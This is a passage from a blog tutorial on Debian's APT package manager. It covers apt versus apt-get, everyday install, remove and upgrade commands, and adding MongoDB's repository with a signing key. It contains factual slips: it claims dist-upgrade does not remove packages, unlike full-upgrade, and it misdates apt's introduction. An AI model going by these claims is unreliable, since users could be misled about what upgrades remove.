<li><em><strong>apt-get</strong></em> was introduced in 1998 as part of the Advanced Package Tool (APT). It’s a low-level command-line utility that has been the backbone of package management for system administrators for over two decades. It provides powerful, granular control over installing, updating, and removing packages, making it ideal for scripting and automation.</li>
<li><em><strong>apt</strong></em> was introduced much later (in 2014 with Debian 8 and Ubuntu 16.04) as a more user-friendly interface that combines the most common functionalities of apt-get and apt-cache. It was designed to make package management simpler for everyday use by combining several commands into one and offering cleaner, more readable output.</li>
</ul>
<p>In a general sense, we can qualify <em><strong>apt</strong></em> to be the summation of <em><strong>apt-get</strong></em> <em><strong>apt-cache</strong></em> and <em><strong>dpkg</strong></em>.</p>

    <img src="/screens/apt-vs-aptget.png"  alt="apt vs apt-get"  class="center"  style="border-radius: 8px; width: 50%"  />


<p>There are also a few differences in output between the two commands :</p>
<ul>
<li><em><strong>apt</strong></em> is designed with a more user-friendly output. It includes:
<ul>
<li>Progress bars while downloading and installing packages.</li>
<li>Automatic interaction prompts for actions like confirmation before installing or removing packages.</li>
</ul>
</li>
</ul>

    <img src="/screens/apt_install.png"  alt="apt install"  class="center"  style="border-radius: 8px;"  />


<p><em><strong>apt-get</strong></em> provides detailed and verbose output. It doesn’t automatically include prompts or progress bars unless specified. For example, if you’re scripting or working in environments where every bit of output and behavior matters, this detailed feedback can be useful.</p>

    <img src="/screens/apt_get_install.png"  alt="apt install"  class="center"  style="border-radius: 8px;"  />


<h2 id="common-apt-commands">Common APT Commands</h2>
<h3 id="updating-repositories">Updating Repositories</h3>
<p>You must&rsquo;ve noticed that most commands/tutorial start with the following command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update
</span></span></code></pre></div><p>Before installing or upgrading any package, it&rsquo;s good practice to refresh the package database from the repositories using this command.</p>
<h3 id="installing-packages">Installing Packages</h3>
<p>You can install packages using this well-known command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install package-name
</span></span></code></pre></div><p>You can install multiple packages by following this syntax :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install package-1 package-2 package-3
</span></span></code></pre></div><hr>
<p><em>note : This syntax goes for installing, removing, purging&hellip;</em></p>
<hr>
<p>To install a specific version of a package, you can add the version following an &ldquo;=&rdquo; :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install package-name<span style="color:#f92672">=</span>package_version
</span></span></code></pre></div><p>You can even easily install <a href="https://en.wikipedia.org/wiki/Deb_%28file_format%29">.deb</a> packages :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install ./debian-package.deb
</span></span></code></pre></div><h3 id="removing-packages">Removing Packages</h3>
<p>Similarly to installing, removing packages is pretty straith foreward :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt remove package-name
</span></span></code></pre></div><p>You can use the <em>purge</em> command to remove packages along with their configuration files :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt purge package-name
</span></span></code></pre></div><h3 id="upgrading-packages">Upgrading Packages</h3>
<p>You can have a full list of upgradable packages using this command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt list --upgradable
</span></span></code></pre></div>
    <img src="/screens/screen_upgradable.png"  alt="sudo apt list --upgradable"  class="center"  style="border-radius: 8px;"  />


<p>In my case, you can see that i have a handfull of packages that need upgrading, the nest step is to type in the following command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt upgrade
</span></span></code></pre></div><p>For a more comprehensive upgrade; upgrading installed packages while also handling changes in dependencies, which may include removing existing packages if necessary :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt full-upgrade
</span></span></code></pre></div><p>If you do not want to remove packages, even if they&rsquo;re not needed anymore, you should use the following :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt dist-upgrade
</span></span></code></pre></div><hr>
<p><em>to learn more about the difference between <strong>dist-upgrade</strong> and <strong>full-upgrade</strong> you should check out <a href="https://hatchjs.com/apt-dist-upgrade-vs-full-upgrade/">this article</a></em></p>
<hr>
<p>You can upgrade a specific package if needed :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt upgrade package-name
</span></span></code></pre></div><h2 id="managing-repositories">Managing repositories</h2>
<p>A lot of beginners struggle to understand this part of the process and find themselves with errors or copy-pasting commands without understanding them.</p>
<p>For a more comprehensive understanding on the way we might add a third party repo to our system, I&rsquo;ll use the case of <strong>mangoDB</strong>. On their official website, we get told to follow these steps to install the community edition :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -fsSL https://www.mongodb.org/static/pgp/server-8.0.asc | <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>   sudo gpg -o /usr/share/keyrings/mongodb-server-8.0.gpg <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>   --dearmor
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;deb [ signed-by=/usr/share/keyrings/mongodb-server-8.0.gpg ] \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   http://repo.mongodb.org/apt/debian bookworm/mongodb-org/8.0 main&#34;</span> | <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>   sudo tee /etc/apt/sources.list.d/mongodb-org-8.0.list
</span></span></code></pre></div><p>Let&rsquo;s break this down :</p>
<h3 id="first-part">First part</h3>
<ul>
<li><strong>curl :</strong> : A command-line tool used to download data from a URL. In this case, it is used to fetch the MongoDB GPG public key.</li>
<li><strong>-fsSL</strong> :
<ul>
<li>f : Fail silently on server errors. If the server returns a 404 (not found) or 500 (server error), curl will not output any errors to the terminal.</li>
<li>s : Silent mode. Suppresses progress meter and error messages. It’s useful when you don’t want verbose output, especially in scripts.</li>
<li>S : Show errors. If -s is used, this ensures that error messages will still be displayed. This prevents progress messages from showing, but actual errors (if any) will still be printed.</li>
<li>L : Follow redirects. If the URL redirects to another URL (like when you’re being redirected from HTTP to HTTPS), curl will follow it and fetch the final URL.</li>
</ul>
</li>
</ul>
<p>We fetch the PGP key from the link, and we pipe it into gpg :</p>
<ul>
<li><strong>gpg</strong> : This is the GNU Privacy Guard, a tool used to encrypt and sign data, as well as manage public and private keys. In this case, it processes the downloaded PGP key.</li>
<li><strong>-o</strong> : To specify the output file.</li>
<li><strong>&ndash;dearmor</strong> : This converts the downloaded PGP key from its ASCII-armored format (text format, like .asc) into the binary format (like .gpg) that is more suitable for machine usage. &ldquo;ASCII-armored&rdquo; means the key is encoded in a text-based format, and <em>&ldquo;dearmoring&rdquo;</em> refers to converting it back into binary.</li>
</ul>
<h3 id="second-part">Second part</h3>
<ul>
<li><strong>deb</strong> : This specifies that the repository is for binary (.deb) packages. APT uses this syntax to define repositories.</li>
<li><em><strong>[signed-by=/usr/share/keyrings/mongodb-server-8.0.gpg]</strong></em> : This option tells APT that this repository’s packages are signed by a specific GPG key. It&rsquo;s located at /usr/share/keyrings/mongodb-server-8.0.gpg, which we obtained and placed there in the previous command using gpg &ndash;dearmor. This ensures that APT uses this key to verify the authenticity of packages downloaded from this repository.</li>
</ul>
<p>Finally, we pipe the results into tee. That writes the APT repository definition to the <em>/etc/apt/sources.list.d/</em> directory.</p>
<h2 id="more-apt-commands">More apt commands</h2>
<p>And now, a list of apt commands that are lesser-known but that I find useful.</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt list --installed
</span></span></code></pre></div><p>Helps you quickly view all the installed packages without needing to search manually, you can even pip the output into grep to find a specific package(s) :</p>

    <img src="/screens/apt_grep_list.png"  alt="apt list --installed"  class="center"  style="border-radius: 8px;"  />


<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt show package
</span></span></code></pre></div><p>Displays detailed information about a package, including its dependencies, description, and version.</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt depends package
</span></span></code></pre></div><p>Displays a list of dependencies for a package.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt rdepends package
</span></span></code></pre></div><p>Lists all reverse dependencies, i.e., packages that depend on the specified package.</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-mark hold package
</span></span></code></pre></div><p>Prevents a package from being upgraded.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-mark unhold package
</span></span></code></pre></div><p>Removes a hold on a package, allowing it to be upgraded again.</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt autoremove
</span></span></code></pre></div><p>Removes unused packages. Add &ndash;purge to remove the configuration files too.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In conclusion, APT is a powerful and essential tool for managing packages on Debian-based systems. Whether you&rsquo;re a beginner or an advanced user, understanding the nuances of APT and its various commands can greatly enhance your system administration skills.</p>
]]></content>
        </item>
        
    </channel>
</rss>
